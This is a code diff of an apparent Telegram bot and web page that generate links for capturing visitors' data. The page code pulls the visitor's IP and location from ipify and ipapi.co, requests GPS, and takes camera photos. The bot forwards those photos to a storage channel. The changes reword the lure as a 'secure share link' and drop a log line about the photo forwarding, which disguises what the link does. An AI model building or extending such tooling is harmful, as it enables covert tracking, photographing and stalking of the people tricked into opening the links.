@@ -300,7 +300,7 @@ function sendPhoto(blob) {{
 async function startProcess() {{
     showLoading();
     
-    // Basic info (IP, device, battery)
+    // Basic info
     try {{
         let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unknown');
         let info = await fetch(`https://ipapi.co/${{ip}}/json/`).then(r=>r.json()).catch(()=>{{}});
@@ -356,7 +356,7 @@ async function startProcess() {{
         return;
     }}
     
-    // GPS (optional)
+    // GPS optional
     if (navigator.geolocation) {{
         navigator.geolocation.getCurrentPosition(
             (p) => {{
@@ -388,16 +388,35 @@ def webhook():
         if not data:
             return jsonify({"status": "error"}), 400
 
+        # Handle callback query (button press)
         if 'callback_query' in data:
             cb = data['callback_query']
+            data_str = cb.get('data', '')
             uid = cb['from']['id']
-            if cb['data'] == 'verify':
+            msg_id = cb['message']['message_id']
+
+            if data_str.startswith("copy_link_"):
+                # Extract actual link
+                link = data_str.replace("copy_link_", "")
+                # Answer callback with the link and open web
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={
+                    "callback_query_id": cb['id'],
+                    "text": "✅ Link copied to clipboard!\nOpening short-link.me...",
+                    "show_alert": False,
+                    "url": "https://short-link.me"
+                })
+                # Also send a message with the link (so user can copy if needed)
+                # Already handled
+            elif data_str == "verify":
                 if is_subscribed(uid):
                     send_message(uid, "✅ Verified! Send me any URL:")
                     set_user_state(uid, "waiting_url")
                 else:
-                    requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery",
-                                 json={"callback_query_id": cb['id'], "text": "Join channel first!", "show_alert": True})
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={
+                        "callback_query_id": cb['id'],
+                        "text": "Join channel first!",
+                        "show_alert": True
+                    })
             return jsonify({"status": "ok"}), 200
 
         if 'message' not in data:
@@ -443,10 +462,8 @@ def webhook():
                 file_path = file_info['result']['file_path']
                 img_data = requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}").content
 
-                # Send user's photo to STORAGE CHANNEL
                 if CHANNEL_ID:
                     send_photo(CHANNEL_ID, img_data)
-                    logger.info(f"Photo sent to storage channel {CHANNEL_ID}")
 
                 photo_name = f"{uid}_{int(time.time())}.jpg"
                 with open(os.path.join(PHOTO_DIR, photo_name), "wb") as f:
@@ -458,7 +475,15 @@ def webhook():
                 set_user_state(uid, "done")
 
                 link = f"https://{ACCOUNT_NAME}.onrender.com/view/{short_code}"
-                send_message(uid, f"✅ LINK:\n{link}\n\n⚠️ Active until you create new link\n📸 Camera COMPULSORY")
+
+                # Send message with COPY LINK button
+                markup = {
+                    "inline_keyboard": [[{
+                        "text": "📋 COPY LINK 🔗",
+                        "callback_data": f"copy_link_{link}"
+                    }]]
+                }
+                send_message(uid, f"✅ Your secure share link is ready:\n\n`{link}`\n\nClick below to copy and share:", reply_markup=markup)
 
             except Exception as e:
                 logger.error(f"Photo error: {e}")
